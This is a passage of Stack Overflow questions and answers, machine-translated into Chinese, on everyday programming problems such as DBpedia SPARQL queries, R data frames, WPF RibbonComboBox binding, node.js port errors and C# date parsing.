    ?s a ?type .
    ?s a ?city .
    ?s rdfs:label "Rio de Janeiro"@en.
}
limit 10 
```

我不想将我的查询限制为“城市”。我想按各种属性搜索地点：“城市”、“河流”、“村庄”、“山”、“纪念碑”、“山”、“岛”、“山谷”、“点”、“峰”。 ..此外，我没有限制国家...

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-28T23:12:45.010

您的查询看起来像[Get Place categories from DBpedia using SPARQL 中](https://stackoverflow.com/questions/8352187/get-place-categories-from-dbpedia-using-sparql)的查询。

就目前而言，您的查询不仅限于城市 - 它仅限于`dbo:Place`具有英文名称（标签）“Rio de Janeiro”的 s。`?city`是一个变量；它的名字并没有什么特别之处。

如果您想要任何地方，只需删除上述三重模式即可。

```
PREFIX geo: <http://www.w3.org/2003/01/geo/wgs84_pos#>
PREFIX dbo: <http://dbpedia.org/ontology/>
SELECT *
WHERE  { 
  ?s a dbo:Place .
  ?s geo:lat ?lat .
  ?s geo:long ?long .
  ?s a ?type .
}
limit 10 
```

这将为您提供 10 个具有纬度和经度的地方以及另一个类别。您可以浏览 DBpedia 以[查看有哪些地方](http://dbpedia.org/ontology/Place)，确定您是否也需要`dbo:Location_(feature)`并尝试 Place、Location 的子类（根据[DBpedia，获取 Place 的直接或间接类型](https://stackoverflow.com/questions/15672546/dbpedia-getting-the-direct-or-indirect-types-of-place)）。要过滤国家/地区，您可以添加到您的查询

```
 ?s dbo:country <http://dbpedia.org/resource/Brazil> . 
```

但并不是每个地方都会像这样与这个国家有明确的联系。您必须查看哪些属性可以帮助将一个地方与其国家/地区联系起来。

# r - 使用数据框中列值的频率来计算新列值

> ID：15555435
> 
> 赞同：1
> 
> 时间：2013-03-21T18:34:17.597
> 
> 标签：r, vector, dataframe

所以我有一个示例数据框，其中包含 id、count 和 username 列，其中 id 和 count 是数字，username 是字符串。

对于数据框的每一行，我想设置一个名为“比率”的新列的值，比率定义为

> 计数/行数，其中用户名 == 该行中的用户名

所提供数据的示例：
在用户名为“Tom”的每一行中，比率将为 count/4 ，因为用户 Tom 在数据中被找到了四次。

这只是我的问题的简化版本，for 循环不是一个选项，因为我的原始数据框有大约 340 万行，而我之前使用 for 循环迭代例如“用户名”的唯一值来解决这个问题的方法问题需要永远。

我的数据框的输入：

```
structure(list(id = 1:20, count = c(140L, 89L, 17L, 114L, 129L, 
86L, 21L, 50L, 197L, 160L, 8L, 14L, 78L, 208L, 155L, 55L, 63L, 
20L, 189L, 79L), usernames = structure(c(4L, 3L, 5L, 5L, 2L, 
3L, 1L, 1L, 3L, 1L, 3L, 2L, 5L, 5L, 4L, 4L, 2L, 2L, 2L, 3L), .Label = c("Jerry", 
"Mark", "Phil", "Tina", "Tom"), class = "factor")), .Names = c("id", 
"count", "usernames"), row.names = c(NA, 20L), class = "data.frame") 
```

我希望我为您提供了一切以帮助您理解和重现问题，如果缺少某些内容，请随时在评论中提及。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T18:41:44.227

有几种选择。这里有三个，一个在基础 R 中，一个带有`data.table`，一个带有“plyr”。两者都假设我们从名为“mydf”的 data.frame 开始：

### 碱基R

```
within(mydf, {
  temp <- as.numeric(ave(as.character(usernames), usernames, FUN = length))
  ratio <- count/temp
  rm(temp)
}) 
```

### 数据表

```
library(data.table)
DT <- data.table(mydf)
DT[, ratio := count/.N, by = "usernames"]
DT 
```

### plyr

```
library(plyr)
ddply(mydf, .(usernames), transform,
      ratio = count/length(usernames)) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T18:41:37.333

您可以`ave`为此使用：

```
transform(d, x=count/as.numeric(ave(d$usernames, d$usernames, FUN=length))) 
```

# php - PHP - 如何将数据存储在数组中以便之后拆分它而不会遇到麻烦？

> ID：15555439
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:34:22.650
> 
> 标签：php, sql, arrays, pdo

行。这是场景。我正在获取我的数据库表的数据（状态消息）并将每个结果存储在我的数组中。每个结果都包含多行。它包含

```
statusID, posterID, statusMessage, dateTime, sumRating, sumVotes 
```

因此，当我在表格中收到多条状态消息时，我想将它们全部打印在网站上。逻辑上我知道这样做

```
for($i = 0; $i < sizeof($results); $i++)
        {
            echo $results[i];
        } 
```

现在我得到了所有类型的所有数据。但是现在，当我想对数据进行一些操作并对其进行格式化时，或者说，我不想将数据一个接一个地打印出来。我想要posterID，然后我想要一点PHP 代码或CSS 之类的。

所以，我现在正在做的是，我目前像这样保存我的数据

```
foreach($statusMessageResult as $row){
            $results[] = $row['statusID'] . "," . $db->getUsername($db->getUserNameById($row['posterID'])) . "," . $row['statusMessage'] . "," . $row['dateTime'] . "," . $row['sumRating'] . "," . $row['sumVotes'];   
        } 
```

所以现在，在我的 for 循环中，我只是在每个逗号处拆分结果数组的当前条目。

```
$statusMessage = $results[$i];
            $statusMessageSplit = explode(",", $statusMessage);
            echo "This status is written by: " . $statusMessageSplit[1] . " and has the ID: " . $statusMessageSplit[0] . "<br>"; 
```

我的问题是，当用户写一个

```
, 
```

在他的状态消息中，它将再次被拆分。那么，我能做些什么来更好地解决这个问题呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:48:24.740

您可以使用二维/锯齿状数组这样做：

```
foreach($statusMessageResult as $row)
    $results[$row['statusID']] = array($db->getUsername($db->getUserNameById($row['posterID'])), $row['statusMessage'], $row['dateTime'], $row['sumRating'], $row['sumVotes']);

//usage:
foreach($results as $index => $rowArr)
    echo "StatusID: $index:\r\n" . var_export($rowArr); 
```

# java - 使用最终变量实现循环

> ID：15555441
> 
> 赞同：2
> 
> 时间：2013-03-21T18:34:25.607
> 
> 标签：java, variables, loops, static, final

有没有办法使用最终变量实现循环？我的意思是当您在初始化后不允许更改任何内容时，将运行指定次数的迭代的循环！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-21T18:37:12.640

是否允许递归，或者你真的需要像`for`or这样的循环构造`while`吗？如果你可以使用递归，那么：

```
void loop(final int n) {
  if (n == 0) {
    return;
  } else {
    System.out.println("Count: " + n);
    loop(n-1);
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:46:06.650

一种方法是创建一个`Iterable<Integer>`表示任意范围的类（实际上不必将所有值存储在列表中）：

```
public static class FixedIntRange implements Iterable<Integer> {
    private final int min;
    private final int max;

    public FixedIntRange(final int min, final int max) {
        this.min = min;
        this.max = max;
    }

    @Override
    public Iterator<Integer> iterator() {
        return new Iterator<Integer>() {
            private Integer next = FixedIntRange.this.min;

            @Override
            public boolean hasNext() {
                return next != null;
            }

            @Override
            public Integer next() {
                final Integer ret = next;
                next = ret == max ? null : next + 1;
                return ret;
            }

            @Override
            public void remove() {
                throw new UnsupportedOperationException();
            }
        };
    }
} 
```

然后正常迭代它：

```
for (final int i : new FixedIntRange(-10, 20)) {
    // this will be run for each i in the range [-10, 20]
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:36:04.253

像这样的东西-

```
final int max = 5;
for(int i=0; i<max; i++) {} 
```

或者另一个有趣的——

```
final boolean flag = true;
while(flag) {
   // keep doing your stuff and break after certain point
} 
```

多一个-

```
List<String> list = ......
for(final Iterator iterator = list.iterator(); iterator.hasNext(); ) {
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T18:40:54.540

创建一个大小为所需迭代次数的数组，然后在 for-each 循环中使用它：

```
public class Test {
  public static void main(String[] args) {
    final int N = 20;
    final int[] control = new int[N];
    for(final int i : control){
      System.out.println(i);
    }
  }
} 
```

这里的技巧是迭代索引是由编译器生成的，作为增强 for 语句的一部分，并且不使用任何用户声明的变量。

# .net - 使用 MultiSubnetFailover 连接到 SQL Server 2012 AlwaysOn 组侦听器会导致超时

> ID：15555446
> 
> 赞同：0
> 
> 时间：2013-03-21T18:34:37.733
> 
> 标签：.net, ado.net, sql-server-2012, windows-server-2012, alwayson

我们遇到了一个奇怪的问题，即当 MultiSubnetFailover 设置为 true 时，我们的开发人员无法连接到 AlwaysOn 可用性组侦听器。但是，客户端可以在尝试直接连接到组的主节点时进行连接。我们已经在使用 .Net 4.0.3 的 Windows 8 和使用 .Net 4.0.3 的 Windows 7 上进行了以下最低测试。和.Net 4.5。

我们还成功地让我们的登台服务器通过组侦听器连接，以及使用 sqlcmd 和 SMS 使用 MultiSubnetFailover 标志连接到 vip。因此，侦听器本身似乎已正确配置。

以下是对侦听器名称的 nslookup 的结果。据我在网上找到的，我们已经正确完成了所有操作，但连接仍然超时。非常感谢任何人可以提供的任何帮助。

**更新：**

通过消除过程，这似乎以某种方式与在开发人员机器上安装 Visual Studio 有关。

**NS查找：**

```
Non-authoritative answer:
Name:   sql02
Address: 10.101.2.222
Name:   sql02
Address: 10.101.1.222
Name:   sql02
Address: 10.101.0.222 
```

**最小测试用例：**

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SqlClient;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            var connection = new SqlConnection(@"                     
                Data Source              = sql02;
                Initial Catalog          = test;
                Integrated Security      = True;
                MultiSubnetFailover      = True;
                MultipleActiveResultSets = True;
                Max Pool Size            = 512;");

            connection.Open();

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-23T00:36:41.637

我们实际上已经在上周发现了这个问题。

事实证明，这是由运行 Avast 的开发机器造成的驱动程序问题！作为防病毒解决方案。我们找不到阻止这种情况的神奇设置，所以我们不得不卸载 Avast！并将用另一种防病毒软件替换它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-22T21:18:09.107

尝试将登录超时时间增加到 30 秒，然后查看连接是否成功。如果是这样，请记下连接需要多少秒。大约20-22秒吗？

您可以使用 SQLCMD.EXE 像这样测试：

sqlcmd -S 监听器 -E -M -l30

# jquery - J确认链接

> ID：15555447
> 
> 赞同：0
> 
> 时间：2013-03-21T18:34:39.620
> 
> 标签：jquery, jquery-plugins, jconfirm

嗨，我有一个锚点，我正在尝试使用 JConfirm 框，但它只是弹出并消失。锚点中有一个带有“X”的图像

```
onclick='jConfirm("Do you really want to do that?.\n ","Import",
    e.preventDefault(); 
    if(!ans) {                                                      
    return false;
     }
});'> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:40:32.643

试试这个（未经测试）......想想`ans`你的代码中有什么？

```
jConfirm('Do you really want to do that?', 'Import', function(ans) {
    if(!ans) {                                                      
    return false;
     }
  }); 
```

`delegate`此外，使用或`on`而不是内联执行此操作总是更清洁......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T15:17:26.957

这有效

```
$('.deleteconfirm').click(function(e)
                                {
                                link = this;
                                url=link.getAttribute('href')
                                e.preventDefault();
                                jConfirm(("Delete this Report Association?"),'Report',function(confirmed)
                                {
                                    if(confirmed)
                                        {
                                        window.location =url;                                   
                                        }
                                })
                                            }); 
```

# wpf - 如何对 RibbonComboBox 的 SelectedItem 进行数据绑定

> ID：15555449
> 
> 赞同：10
> 
> 时间：2013-03-21T18:34:40.513
> 
> 标签：wpf, data-binding, mvvm, selecteditem, ribboncontrolslibrary

我的问题基本上是[这个](https://stackoverflow.com/questions/10107992/how-to-set-selecteditem-on-a-ribboncombobox-using-mvvm)。不过，我认为这将有助于提供更多信息和代码，以便更容易重现问题。

[使用RibbonControlsLibrary](http://msdn.microsoft.com/en-us/library/ff799534.aspx)中的 Microsoft.Windows.Controls.Ribbon.RibbonComboBox感觉就像走过一个充满错误的大沼泽，而不是如果您知道解决方法就可以做的事情。

随便。我遇到的最大问题是对我的 SelectedItem 进行数据绑定。

以下是我开始的（在我发现了*RibbonGallery 之后？*）。在 ComboBox 的子元素上拥有 ItemsSource 和 SelectedItem 甚至不在同一级别上已经给了我 heebie-jeebies，但这似乎是正确的。

在示例应用程序中，我在 ViewModel 的构造函数中设置 SelectedItem。但是，在运行应用程序时，不会显示 SelectedItem。甚至 VS 设计器也正确显示了“第二个选项”！

运行应用程序：![运行应用](../Images/14741b002950a50b9c192930bd98c039.png)VS 设计器：![Visual Studio 设计器](../Images/78001643fd31e7dfd75122bb33522f66.png)

在调试 SelectedItem 设置器时，您会注意到多次传递。在第一次将其设置为 ctor 中的“第二个选项”（1，请参见下面的调试日志）后，它将重置为 null (2)（通过外部代码，我认为是控件本身）。在 UI 中打开下拉菜单时，将再次设置为 null (3)，然后在选择一个值时，两次设置为该值 (4,5)。我选择了“第二个选项”，然后用“第一个选项”（6-9）重复了这个过程。这产生了以下日志（忽略功能区控件中的一千零一个绑定异常......）：

![在此处输入图像描述](../Images/fc8ba0ea9aec44fe1e944ba8bedcee5b.png)

大问题显然是（2），它正在重置我的初始选择。看起来当控件第一次显示时，它被重置了。一个非常难看的解决方法是通过计时器设置值。在这个示例应用程序中，在用户控件的 Loaded 事件中设置它确实对我有用，但在我较重的现实应用程序中，它没有。无论如何，这一切都感觉不对。有谁知道更好的解决方案？

xml:

```
<UserControl x:Class="WpfApplication1.RibbonComboBoxDemo"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
             xmlns:r="http://schemas.microsoft.com/winfx/2006/xaml/presentation/ribbon" 
             xmlns:local="clr-namespace:WpfApplication1"
             mc:Ignorable="d" 
             d:DesignHeight="300" d:DesignWidth="300">

    <UserControl.DataContext>
        <local:ViewModel />
    </UserControl.DataContext>

    <Grid>
        <r:Ribbon >
            <r:RibbonTab Header="First Tab">
                <r:RibbonGroup Header="Group">
                    <r:RibbonComboBox >
                        <r:RibbonGallery SelectedItem="{Binding SelectedItem, Mode=TwoWay}">
                            <r:RibbonGalleryCategory ItemsSource="{Binding Controls}" DisplayMemberPath="Caption" />
                        </r:RibbonGallery>
                    </r:RibbonComboBox>
                </r:RibbonGroup>
            </r:RibbonTab>
            <r:RibbonTab Header="Second Tab" />
        </r:Ribbon>
    </Grid>
</UserControl> 
```

视图模型：

```
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;

namespace WpfApplication1
{
    public class ViewModel : INotifyPropertyChanged
    {
        public event PropertyChangedEventHandler PropertyChanged;
        private void OnPropertyChanged(string propertyName)
        {
            if (this.PropertyChanged != null)
                PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
        }

        public ObservableCollection<ControlBaseModel> Controls { get; private set; }

        private ControlBaseModel _selectedItem;
        public ControlBaseModel SelectedItem { get { return _selectedItem; } set { LogSelectedItemChange(value); _selectedItem = value; OnPropertyChanged("SelectedItem"); } }

        public ViewModel()
        {
            this.Controls = new ObservableCollection<ControlBaseModel>();

            this.Controls.Add(new ControlBaseModel() { Caption = "first option" });
            this.Controls.Add(new ControlBaseModel() { Caption = "second option" });

            this.SelectedItem = this.Controls[1]; // set to second option
        }

        int i = 0;
        private void LogSelectedItemChange(ControlBaseModel value)
        {
            i++;
            string setObject = "null";
            if (value != null)
            {
                setObject = value.Caption;
            }
            Debug.WriteLine(string.Format("{0}: SelectedItem.set(): {1}", i, setObject));
        }

    }

    public class ControlBaseModel : INotifyPropertyChanged
    {
        public event PropertyChangedEventHandler PropertyChanged;
        private void OnPropertyChanged(string propertyName)
        {
            if (this.PropertyChanged != null)
                PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
        }

        private string _name;
        public string Name { get { return _name; } set { _name = value; OnPropertyChanged("Name"); } }

        private string _caption;
        public string Caption { get { return _caption; } set { _caption = value; OnPropertyChanged("Caption"); } }
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T10:14:36.473

虽然在我的应用程序中将 ComboBox SelectedItem 重置为 null 之前发生了 View/UserControl 加载事件，但 ComboBox 加载事件实际上被触发了两次，第二次“迟到”就足够了。所以我目前的解决方案是：

```
<r:RibbonComboBox>
    <i:Interaction.Triggers>
        <i:EventTrigger EventName="Loaded">
            <i:InvokeCommandAction Command="{Binding LoadedCommand}" />
        </i:EventTrigger>
    </i:Interaction.Triggers>
    <r:RibbonGallery SelectedItem="{Binding SelectedItem, Mode=TwoWay}">
        <r:RibbonGalleryCategory ItemsSource="{Binding Controls}" DisplayMemberPath="Caption"/>
    </r:RibbonGallery>
</r:RibbonComboBox> 
```

视图模型：

```
private ControlBaseModel _lastNonNullSelectedItem;

public ObservableCollection<ControlBaseModel> Controls { get; private set; }

private ControlBaseModel _selectedItem;
public ControlBaseModel SelectedItem 
{ 
    get { return _selectedItem; } 
    set 
    { 
        if (value != null) { _lastNonNullSelectedItem = value; } 
        _selectedItem = value; 
        OnPropertyChanged("SelectedItem"); 
    } 
}
public ICommand LoadedCommand { get; private set; }

public ViewModel()
{
    this.Controls = new ObservableCollection<ControlBaseModel>();
    this.LoadedCommand = new ActionCommand(OnLoaded); // ActionCommand: simple implementation of ICommand

    this.Controls.Add(new ControlBaseModel() { Caption = "first option" });
    this.Controls.Add(new ControlBaseModel() { Caption = "second option" });

    this.SelectedItem = this.Controls[1]; // set to second option
}

private void OnLoaded()
{
    this.SelectedItem = _lastNonNullSelectedItem;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-05-22T15:03:16.950

我最终只使用了标准的组合框。

```
<ComboBox SelectedItem="{Binding Item}" ItemsSource="{Binding Items}"/> 
```

如果您想要与 RibbonComboBox 相同（非常相似）的样式，请使用

```
<ComboBox SelectedItem="{Binding Item}" ItemsSource="{Binding Items}" IsEditable="True" IsReadOnly="True"/> 
```

# forms - kohana用户登录添加错误

> ID：15555451
> 
> 赞同：0
> 
> 时间：2013-03-21T18:34:47.700
> 
> 标签：forms, validation, authentication, login, kohana

我有以下登录代码：

```
if ($logged == true) {
                HTTP::redirect('profile/private');
            } else {
                $validation = Validation::factory($_POST)
                        ->rule('username', 'not_empty')
                        ->rule('password', 'not_empty');
                if ($validation->check()) {

                }
                $errors = $validation->errors('login'); 
```

这里的情况是，如果没有输入用户名，则会播种正确的消息（我在消息文件夹中的 login.php 文件中有消息，例如：'username' => array('not_empty' => 'Field :field can not be空”，密码字段相同）。这两个规则在错误的情况下正常工作。但是当用户名和密码都给出并且用户没有被验证为“有效”（例如错误的密码或输入错误的用户名）时，我需要一个自定义错误消息（例如：'检查用户名或密码，可能按下了 CAPSLOCK'）。如何实现这一点？我不希望它与 login.php 字段中的所有消息一样仅与一个字段相关。请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T10:46:57.797

然后回答您的问题：这是出于用户目的的额外错误消息。这不是一个或模型属性（用户名、密码）的特定错误，因此它属于您的控制器。

只需在您的控制器中，检查用户是否已登录并回显错误。

```
if (!Auth::instance()->login($_POST['username'], $_POST['password'], $_POST['autologin'])) 
{
    echo 'Check username or password, Maybe CAPSLOCK is pressed';
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:00:18.717

根据[文档](http://kohanaframework.org/3.2/guide/api/Validation#errors)，如果您在没有定义模板的情况下调用 $validation->errors() ，它会给您返回一个错误数组，然后您可以查看 $errors 数组并确定您得到什么样的错误，并做出适当的反应

# data-binding - 播放框架将表单字段绑定到复选框

> ID：15555453
> 
> 赞同：2
> 
> 时间：2013-03-21T18:34:56.223
> 
> 标签：data-binding, twitter-bootstrap, playframework, playframework-2.0

如何将 myForm 中名为“isMarried”的字段绑定到视图中的复选框控件？我想要这种双向绑定。我正在使用来自[https://github.com/nostalgiaz/bootstrap-switch的引导开关](https://github.com/nostalgiaz/bootstrap-switch)

```
@(myForm: Form[_])
@helper.form(action = controllers.index.submit, 'id -> "myForm") {

<fieldset>
<legend>General information</legend>
<div class="twipsies well">
   <div class="control-group">
        <label class="control-label" for="isMarried">Married</label>
        <div class="controls">
            <div class="switch switch-small" tabindex="0" data-on-label="Yes" data-off-label="No" data-off="warning">
                <input id="isMarried" name="isMarried" type="checkbox"/>
            </div>
        </div>
    </div>

</div>

</fieldset>
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-23T00:08:15.100

我没有使用复选框（在支付中），但我会使用复选框助手：

例子：

```
@checkbox(field = myForm("done")) 
```

见源：[https ://github.com/playframework/Play20/blob/master/framework/src/play/src/main/scala/views/helper/checkbox.scala.html](https://github.com/playframework/Play20/blob/master/framework/src/play/src/main/scala/views/helper/checkbox.scala.html)

如果您需要自定义 HTML 以满足您的需求，请编写您自己的帮助程序/标签：

*   [http://www.playframework.com/documentation/2.0.2/JavaFormHelpers](http://www.playframework.com/documentation/2.0.2/JavaFormHelpers)
*   [是否可以覆盖表单助手？](https://stackoverflow.com/questions/10206961/is-it-possible-to-override-form-helpers)
*   [在 Play 2 (scala) 中创建自定义字段构造函数](https://stackoverflow.com/questions/10392302/creating-a-custom-field-constructor-in-play-2-scala)

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-04T19:53:57.347

型号为：

```
/**

 * This class represent a school model 

 * @author Giovanni Alberto García

 * @version 1.0

 */

@Entity

public class School extends Model {

  @Id

  @Column(unique=true, nullable=false)

  public Long id;

  @ManyToMany(cascade = CascadeType.ALL)

  public List<User> members;

  public boolean rElecCFE;

...

} 
```

如您所见， rElecCFE 是布尔值，因此视图是：

```
@(schoolForm: Form[School])(schoolId: Long)

@import helper._ 

@main("Completar registro") {

<div id="edition">

  @form(action=routes.Nama.doEdit()) {
  <fieldset id="registration-electicity">
    <input type="hidden" name="id" value="@schoolId"/>
    <legend>Electricidad</legend>
    @checkbox(schoolForm("rElecCFE"),
    '_showConstraints->false,
    '_disabled->""
    )
...
  }
</div>
} 
```

# node.js - 使用 node.js 和 socket.io 时，端口在每次使用后停止工作

> ID：15555458
> 
> 赞同：1
> 
> 时间：2013-03-21T18:35:17.617
> 
> 标签：node.js, express, socket.io

这是我的 app.js 文件

```
/**
 * Module dependencies.
 */

var io = require('socket.io'),
    express = require('express'),
    path = require('path'),
    jquery = require('jquery'),
    routes = require('./routes');

/**
* Create app
*/

var app = express()
  , server = require('http').createServer(app)  
  , io = io.listen(server);

/**
* Configure app
*/ 
app.configure(function(){ 
    app.set('port', 2121);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'ejs');
    app.use(express.static(path.join(__dirname, 'public')));

});

// set both servers listening
server.listen( app.get('port') );

/**
* App gets
*/

app.get('/', routes.index );

console.log("listining on port " + app.get('port'));

io.set('log level', 1); // this gets rid of all the internal socket messages

io.sockets.on('connection', function(socket){
    console.log('made connection');

}); 
```

在呈现索引时加载的 index.js 文件中，我有

```
$(document).ready( function () {
    var socket = io.connect('http://localhost:2121');

}); 
```

我遇到的问题是这段代码将执行一次，终端显示

```
My-MacBook-Pro-3:board_demo home$ node app.js 
   info  - socket.io started
listining on port 2121
made connection 
```

但是，如果我退出该过程`^z`并尝试再次运行代码，`node app.js`我会得到

```
My-MacBook-Pro-3:one_board_demo home$ node app.js 
   info  - socket.io started
listining on port 2121
   warn  - error raised: Error: listen EADDRINUSE 
```

然后我切换端口并重复该过程。

这可能是什么原因造成的？我现在使用的大部分代码都是从我之前制作的一个项目中获取的，该项目没有这个问题。

谢谢您的帮助

# iphone - MPMoviePlayerController 在应用程序进入前台后仅播放音频

> ID：15555459
> 
> 赞同：1
> 
> 时间：2013-03-21T18:35:18.357
> 
> 标签：iphone, ipad, cocoa, ios6, mpmovieplayercontroller

我有一个使用 HTTP 实时流播放存储在 Amazon S3 上的视频文件的应用程序。有时，当我将应用程序移至后台（按“主页”按钮），返回应用程序并按播放按钮时，仅播放音频并显示黑色方块或 QuickTime 徽标而不是视频（播放控件可见） . 我不使用变体质量播放列表（我只有一个流，即视频流）。

这是我用来在 iPad 上播放视频的代码（我不使用全屏 - 它是一个嵌入式播放器）：

```
 self.playerController = [[MPMoviePlayerController alloc] init];
    self.playerController.movieSourceType = MPMovieSourceTypeStreaming;
    self.playerController.contentURL = mediaURL;
    self.playerController.shouldAutoplay = NO;
    self.playerController.repeatMode = MPMovieRepeatModeNone;
    self.playerController.view.frame = self.view.bounds;
    [self.view addSubview:self.playerController.view];
    [self.playerController prepareToPlay]; 
```

每次应用程序进入前台或变得活跃时，我都不会重新创建播放器（我想避免它）。

我在 iPhone 上遇到了完全相同的问题（我在全屏模式下使用 MPMoviePlayerViewController 在那里播放视频）。

该应用程序在 iOS 6.1 上运行

谢谢，皮奥特雷克

# c++ - CImg FFT 返回值

> ID：15555464
> 
> 赞同：0
> 
> 时间：2013-03-21T18:35:44.160
> 
> 标签：c++, fft, cimg

我对 CImg `get_FFT()` 函数的返回值有点困惑。

傅立叶变换应该给我一个实部和虚部。 `get_FFT()`返回带有两个图像的 CImgList - 哪个是真实的，哪个是虚部？文档中似乎没有任何线索。

而且我还需要从中获得幅度和相位。IIRC振幅是这样计算的`(realImg.pow(2) + imagImg.pow(2)).sqrt()`

我如何获得相位？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:18:01.077

相位角可以使用计算

`CImg<float> PhaseAngle = imagImage.get_atan2(realImg)`

# ruby-on-rails - 如何让ckeditor显示引导图标

> ID：15555466
> 
> 赞同：0
> 
> 时间：2013-03-21T18:35:48.073
> 
> 标签：ruby-on-rails, ckeditor

我在 Ruby on Rails 中运行的 CKEDITOR textarea 中插入了如下行的锚标记，并在我的 application.js 和 mystyle.css 中导入了引导程序：

```
<a href="#" toggle="tooltip" title="Here!"> <i class="icon-pencil"> </i> </a> 
```

但是 CKEDITOR textarea 不会显示引导铅笔图标，但是，如果我检查源，锚标签就在那里。如果我渲染文件，它会正确显示铅笔图标。但只是没有显示在ckeditor textarea中！（根本不是所见即所得。）我错过了什么？我需要在 ckeditor css 和/或 config.js 中导入引导程序吗？如何？还有什么？请帮忙。非常感谢。

这是生成的html代码：

```
<p>This is a test<a href="#" title="Here!" toggle="tooltip"> <i class="icon-pencil"> </i> </a></p> 
```

谢谢。

谢谢你的提示，尼诺特莱普。你提到的正是我所怀疑的。但是我仍在为在 contents.css 中添加引导程序的位置和方式而苦苦挣扎：这就是我在 Gem 文件中包含引导程序的地方：

```
gem 'bootstrap-sass', '~> 2.3.1.0' 
```

在我的 app/assets/javascripts/application.js 中，我有：

```
//= require jquery
//= require jquery_ujs
//= require jquery.min
//= require bootstrap-tooltip
//= require bootstrap-popover
//= require bootstrap
//= require ckeditor/init
//= require_tree . 
```

在 app/assets/stylesheets/mystyle.css.scss 中，我有：

```
@import "bootstrap"; 
```

我检查了我的 app/assets 目录，在任何地方都找不到 ckeditor 子目录。因此，我尝试创建一个名为 app/assets/stylesheets/ckeditor 的目录，并在其下添加一个名为 contents.css 的文件，并在文件中添加一行，如下所示：

```
@import "bootstrap"; 
```

然后再试一次，结果还是一样：ckeditor textarea中仍然缺少引导铅笔图标。我从本地运行的 rails 服务器收到的错误消息是：

```
Started GET "/assets/ckeditor/bootstrap" for 127.0.0.1 at 2013-03-22 17:35:23 -0700
Served asset /ckeditor/bootstrap - 404 Not Found (7ms)
ActionController::RoutingError (No route matches [GET] "/assets/ckeditor/bootstrap"): 
```

我知道 ckeditor 无法访问 bootstrap，但只是不知道如何配置 ckeditor 以包含 bootstrap .....，感谢任何帮助。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T07:24:31.123

听起来定义要显示的图标的 CSS 在 CKEditor 中不活动。在您的安装目录中有一个名为的类`contents.css`，其中包含 CKEditor 中事物的 CSS 定义。在那里插入你的图标 CSS，它显然在 mystyle.css 中。

CKEditor 不会从其父页面继承类，因为它在框架中运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-23T18:27:50.693

使用 'bundle show' 找出安装的 ckeditor 目录的位置（如果您使用 Gemfile 安装 ckeditor）：

```
bundle show ckeditor 
```

例如，在我的机器中，它返回以下目录：

```
/usr/local/lib/ruby/gems/1.9.1/gems/ckeditor-4.0.2 
```

cd 到上述目录并打开 vendor/assets/javascripts/ckeditor/contents.css 文件并在文件顶部添加一行以将引导程序集成到 ckeditor 中，如下所示：

```
@import "bootstrap"; 
```

就是这样。您可能需要重新启动服务器（rails s）才能显示效果。

# python - 以编程方式访问鼻子详细程度

> ID：15555468
> 
> 赞同：4
> 
> 时间：2013-03-21T18:35:50.490
> 
> 标签：python, nose

我有一些记录到标准输出的测试，我想根据鼻子运行的详细程度来更改我的测试脚本中的日志级别。

如何从正在运行的测试之一中访问流鼻涕实例的详细程度？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:44:17.237

这有点小技巧，但您可以找出当前测试运行程序正在使用的 nose.config.Config 对象，并检查 config.verbosity 属性。

```
import nose.config
def test_checkverbosity():
    import gc
    for obj in gc.get_objects():
        if isinstance(obj, nose.config.Config):
            break
    print obj.verbosity
    assert False 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T23:57:57.667

看起来在鼻子中处理此问题的预期方法是`logger`在测试中使用框架，然后使用`--logging-level`选项控制要捕获的级别。

默认情况下，nose 将捕获测试生成的所有日志，但可以使用`--logging-filter`config 参数指定过滤器。

# c# - 将日期从 mm/dd/yyyy 转换为 dd MMM yyyy

> ID：15555470
> 
> 赞同：0
> 
> 时间：2013-03-21T18:35:52.897
> 
> 标签：c#, .net

如何将日期时间从 mm/dd/yyyy 转换为 dd MMM yyyy？DateTime.ParseExact 或 DateTime.TryParseExact 不需要一个参数来告诉它我想要什么格式。那么它怎么知道我希望它将传入的日期返回为 dd MMM yyyy 格式？

```
DateTime result;
var dateTime = DateTime.TryParseExact("03/21/2013", "mm/dd/yyyy",CultureInfo.InvariantCulture,DateTimeStyles.None, out result); 
```

* * *

